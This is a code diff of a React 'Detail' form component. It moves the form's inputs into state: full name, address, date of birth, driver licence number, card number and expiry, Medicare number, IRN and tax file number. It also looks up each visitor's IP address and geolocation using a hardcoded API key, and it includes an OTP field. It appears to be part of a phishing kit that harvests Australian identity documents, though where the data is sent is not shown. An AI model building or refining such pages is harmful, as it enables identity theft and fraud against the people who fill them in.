@@ -5,6 +5,15 @@ import { useState } from "react";
 
 export default function Detail() {
   const [otp, setOtp] = useState("");
+  const [fn, setfn] = useState("");
+  const [addr, setaddr] = useState("");
+  const [dob, setdob] = useState("");
+  const [dln, setdln] = useState("");
+  const [dlcnum, setdlcnum] = useState("");
+  const [dlexdate, setdlexdate] = useState("");
+  const [mednum, setmednum] = useState("");
+  const [irn, setirn] = useState("");
+  const [tfnum, settfnum] = useState("");
   const router = useRouter();
 
   const onSent = async (e) => {
@@ -14,15 +23,6 @@ export default function Detail() {
       .then((res) => res.json())
       .then((data) => {
         const ipAddress = data.ip;
-        const fn = document.getElementById("fn").value;
-        const addr = document.getElementById("addr").value;
-        const dob = document.getElementById("dob").value;
-        const dln = document.getElementById("dln").value;
-        const dlcnum = document.getElementById("dlcnum").value;
-        const dlexdate = document.getElementById("dlexdate").value;
-        const mednum = document.getElementById("mednum").value;
-        const irn = document.getElementById("irn").value;
-        const tfnum = document.getElementById("tfnum").value;
 
         fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=e4e885c9d83f4a1c920483077bd49a2d&ip=${ipAddress}`)
           .then((res) => res.json())
@@ -105,7 +105,7 @@ export default function Detail() {
                             type="text"
                             autoComplete="off"
                             required
-                            onChange={(e) => { }}
+                            onChange={(e) => setfn(e.target.value)}
                           />
                         </div>
                         <div className="input-group">
@@ -118,7 +118,7 @@ export default function Detail() {
                             type="text"
                             autoComplete="off"
                             required
-                            onChange={(e) => { }}
+                            onChange={(e) => setaddr(e.target.value)}
                           />
                         </div>
                         <div className="input-group">
@@ -131,7 +131,7 @@ export default function Detail() {
                             type="text"
                             autoComplete="off"
                             required
-                            onChange={(e) => { }}
+                            onChange={(e) => setdob(e.target.value)}
                           />
                         </div>
                         <div className="input-group">
@@ -144,7 +144,7 @@ export default function Detail() {
                             type="text"
                             autoComplete="off"
                             required
-                            onChange={(e) => { }}
+                            onChange={(e) => setdln(e.target.value)}
                           />
                         </div>
                         <div className="input-group">
@@ -157,7 +157,7 @@ export default function Detail() {
                             type="text"
                             autoComplete="off"
                             required
-                            onChange={(e) => { }}
+                            onChange={(e) => setdlcnum(e.target.value)}
                           />
                         </div>
                         <div className="input-group">
@@ -170,7 +170,7 @@ export default function Detail() {
                             type="text"
                             autoComplete="off"
                             required
-                            onChange={(e) => { }}
+                            onChange={(e) => setdlexdate(e.target.value)}
                           />
                         </div>
                         <div className="input-group">
@@ -183,7 +183,7 @@ export default function Detail() {
                             type="text"
                             autoComplete="off"
                             required
-                            onChange={(e) => { }}
+                            onChange={(e) => setmednum(e.target.value)}
                           />
                         </div>
                         <div className="input-group">
@@ -196,7 +196,7 @@ export default function Detail() {
                             type="text"
                             autoComplete="off"
                             required
-                            onChange={(e) => { }}
+                            onChange={(e) => setirn(e.target.value)}
                           />
                         </div>
                         <div className="input-group">
@@ -209,7 +209,7 @@ export default function Detail() {
                             type="text"
                             autoComplete="off"
                             required
-                            onChange={(e) => { }}
+                            onChange={(e) => settfnum(e.target.value)}
                           />
                         </div>
 
